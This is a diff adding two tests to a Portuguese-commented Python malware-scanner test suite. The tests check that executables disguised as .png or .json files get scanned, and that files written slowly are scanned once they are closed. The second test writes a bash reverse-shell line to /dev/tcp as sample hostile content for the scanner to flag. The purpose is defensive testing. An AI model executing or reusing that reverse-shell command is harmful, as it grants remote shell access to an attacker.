@@ -288,6 +288,89 @@ class TestAutoScanWiring:
             await engine.stop()
 
     @pytest.mark.asyncio
+    async def test_end_to_end_elf_disguised_as_png_and_json_scanned(
+        self, tmp_path: Path
+    ) -> None:
+        """Teste intenso (rodada 2026-10-26): cópia de /bin/true (inofensivo)
+        como `update.png` e `x.json`. Antes o .png nunca chegava ao scan (a
+        extensão não é executável, e o scanner ainda pulava .png) e o .json
+        era escaneado só com H024, então o H022 (disfarce) nunca rodava em
+        tempo real."""
+        from ekprotection.logs.models import EventType, QueryFilter
+
+        watched = tmp_path / "watch"
+        watched.mkdir()
+
+        manager = ConfigManager(tmp_path / "config.yaml")
+        manager.load()
+        manager.set("monitor.paths", [str(watched)])
+
+        engine = EKEngine(manager)
+        await engine.start()
+        try:
+            elf = Path("/bin/true").read_bytes()
+            png = watched / "update.png"
+            png.write_bytes(elf)
+            jsn = watched / "x.json"
+            jsn.write_bytes(elf)
+            real_png = watched / "logo.png"
+            real_png.write_bytes(b"\x89PNG\r\n\x1a\n" + b"\x00" * 64)
+
+            seen: set[str] = set()
+            for _ in range(50):  # até ~5s
+                await asyncio.sleep(0.1)
+                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
+                seen = {e.file_path for e in entries}
+                if {str(png), str(jsn)} <= seen:
+                    break
+
+            assert str(png) in seen, "ELF disfarçado de .png não foi escaneado em tempo real"
+            assert str(jsn) in seen, "ELF disfarçado de .json não foi escaneado em tempo real"
+            assert str(real_png) not in seen
+        finally:
+            await engine.stop()
+
+    @pytest.mark.asyncio
+    async def test_end_to_end_slow_write_scanned_after_close(
+        self, tmp_path: Path
+    ) -> None:
+        """2026-10-26: o auto-scan rodava no IN_CREATE, com o arquivo pela
+        metade (medido: download em 4 partes escaneado com 6735 de 26936
+        bytes). Script com o reverse shell só no último pedaço, como chega
+        de um `curl -o` lento: tem que ser pego no IN_CLOSE_WRITE."""
+        from ekprotection.logs.models import EventType, QueryFilter
+
+        watched = tmp_path / "watch"
+        watched.mkdir()
+
+        manager = ConfigManager(tmp_path / "config.yaml")
+        manager.load()
+        manager.set("monitor.paths", [str(watched)])
+
+        engine = EKEngine(manager)
+        await engine.start()
+        try:
+            evil = watched / "update.sh"
+            with open(evil, "wb") as f:
+                f.write(b"#!/bin/bash\n" + b"# padding\n" * 50)
+                f.flush()
+                await asyncio.sleep(0.5)  # o CREATED já foi escaneado aqui
+                f.write(b"bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
+
+            match = None
+            for _ in range(50):  # até ~5s
+                await asyncio.sleep(0.1)
+                entries = engine.logs.query(QueryFilter(event_type=EventType.SCAN_MATCH))
+                match = next((e for e in entries if e.file_path == str(evil)), None)
+                if match is not None:
+                    break
+
+            assert match is not None, "conteúdo escrito depois do IN_CREATE não foi escaneado"
+            assert match.level.value == "CRITICAL"
+        finally:
+            await engine.stop()
+
+    @pytest.mark.asyncio
     async def test_end_to_end_real_eicar_via_fs_watcher(
         self, tmp_path: Path
     ) -> None:
